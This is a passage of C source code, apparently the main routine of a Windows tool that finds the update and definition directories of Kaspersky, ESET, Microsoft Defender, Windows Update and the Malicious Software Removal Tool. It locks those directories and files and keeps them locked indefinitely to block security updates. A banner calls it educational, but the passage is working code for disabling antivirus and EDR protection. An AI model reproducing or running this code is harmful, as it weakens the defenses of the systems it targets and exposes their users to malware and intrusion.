    printf("  Intended strictly for educational purposes and for\n");
    printf("  understanding how AV/EDR update mechanisms work, so\n");
    printf("  such flaws can be fixed.\n");
    printf("=============================================================\n");

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    PreLockCriticalFiles();

    // --- KASPERSKY ---
    char (*kp)[MAX_PATH_STR] = (char (*)[MAX_PATH_STR])
        LocalAlloc(LMEM_ZEROINIT, MAX_KASPERSKY_PATHS * MAX_PATH_STR);
    DWORD kc = 0;
    if (kp) {
        DiscoverKasperskyPaths(kp, &kc);
        DWORD dirLocked = 0, filesLocked = 0;
        for (DWORD i = 0; i < kc; i++) {
            const char* name = UpStrRChr(kp[i], '\\');
            name = name ? name + 1 : kp[i];
            { char t[] = "Temp"; if (UpStrICmp(name, t) != 0) {
                if (LockDirectory(kp[i])) dirLocked++;
            }}
            SpawnMonitor(kp[i], TRUE);
            filesLocked += PreLockDirectory(kp[i], 3);
        }
        printf("[*] Kaspersky: %u dirs locked, %u files locked\n", dirLocked, filesLocked);
    }

    // --- ESET ---
    char (*ep)[MAX_PATH_STR] = (char (*)[MAX_PATH_STR])
        LocalAlloc(LMEM_ZEROINIT, MAX_KASPERSKY_PATHS * MAX_PATH_STR);
    DWORD ec = 0;
    if (ep) {
        char esetInstall[MAX_PATH_STR] = {0};
        char esetData[MAX_PATH_STR] = {0};
        if (GetEsetPath(esetInstall, esetData)) {
            if (esetData[0]) {
                FindEsetUpdatePaths(esetData, ep, &ec, MAX_KASPERSKY_PATHS);
                if (esetInstall[0] && UpStrLen(esetInstall) + 8 < MAX_PATH_STR) {
                    char modDir[MAX_PATH_STR];
                    UpStrCpy(modDir, esetInstall);
                    UpStrCat(modDir, "\\Modules");
                    if (GetFileAttributesA(modDir) != INVALID_FILE_ATTRIBUTES) {
                        BOOL dup = FALSE;
                        for (DWORD j = 0; j < ec; j++)
                            if (UpStrICmp(ep[j], modDir) == 0) { dup = TRUE; break; }
                        if (!dup && ec < MAX_KASPERSKY_PATHS) {
                            UpStrCpy(ep[ec], modDir); ec++;
                        }
                    }
                }
            }
            DWORD dirLocked = 0, filesLocked = 0;
            for (DWORD i = 0; i < ec; i++) {
                const char* name = UpStrRChr(ep[i], '\\');
                name = name ? name + 1 : ep[i];
                { char t[] = "cache"; if (UpStrICmp(name, t) != 0) {
                    if (LockDirectory(ep[i])) dirLocked++;
                }}
                SpawnMonitor(ep[i], TRUE);
                filesLocked += PreLockDirectory(ep[i], 3);
            }
            printf("[*] ESET: %u dirs locked, %u files locked\n", dirLocked, filesLocked);
        } else {
            printf("[*] ESET: not found\n");
        }
    }

    // --- WINDOWS / DEFENDER ---
    { char d[] = "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates";
    SpawnMonitor(d, TRUE);
    printf("[*] Defender Defs: %d files locked\n", PreLockDirectory(d, 3)); }
    { char d[] = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform";
    if (GetFileAttributesA(d) != INVALID_FILE_ATTRIBUTES) {
        SpawnMonitor(d, TRUE);
        printf("[*] Defender Platform: %d files locked\n", PreLockDirectory(d, 2));
    } }
    { char d[] = "C:\\Program Files\\Windows Defender";
    if (GetFileAttributesA(d) != INVALID_FILE_ATTRIBUTES) {
        SpawnMonitor(d, TRUE);
        printf("[*] Defender Bin: %d files locked\n", PreLockDirectory(d, 2));
    } }
    { char d[] = "C:\\Program Files\\Windows Defender\\MpEngineStore";
    if (GetFileAttributesA(d) != INVALID_FILE_ATTRIBUTES) {
        LockDirectory(d);
        SpawnMonitor(d, TRUE);
        printf("[*] Defender EngineStore dir locked\n");
    } }
    { char d[] = "C:\\Windows\\SoftwareDistribution\\Download";
    SpawnMonitor(d, TRUE);
    printf("[*] WU Download: %d files locked\n", PreLockDirectory(d, 3)); }
    { char d[] = "C:\\Windows\\SoftwareDistribution\\DataStore";
    SpawnMonitor(d, TRUE);
    printf("[*] WU DataStore: %d files locked\n", PreLockDirectory(d, 3)); }
    { char d[] = "C:\\Windows\\SoftwareDistribution\\DeliveryOptimization";
    if (GetFileAttributesA(d) != INVALID_FILE_ATTRIBUTES) {
        SpawnMonitor(d, TRUE);
        printf("[*] WU DeliveryOpt: %d files locked\n", PreLockDirectory(d, 2));
    } }
    { char d[] = "C:\\Windows\\SoftwareDistribution\\AuthCabs";
    if (GetFileAttributesA(d) != INVALID_FILE_ATTRIBUTES) {
        SpawnMonitor(d, TRUE);
        printf("[*] WU AuthCabs: %d files locked\n", PreLockDirectory(d, 1));
    } }
    { char d[] = "C:\\Windows\\System32\\MRT";
    if (GetFileAttributesA(d) != INVALID_FILE_ATTRIBUTES) {
        SpawnMonitor(d, TRUE);
        printf("[*] MRT: %d files locked\n", PreLockDirectory(d, 1));
    } }

    if (kp) LocalFree(kp);
    if (ep) LocalFree(ep);

    printf("All blockers active. Press Ctrl+C to stop.\n");

    for (;;) Sleep(1000);
}
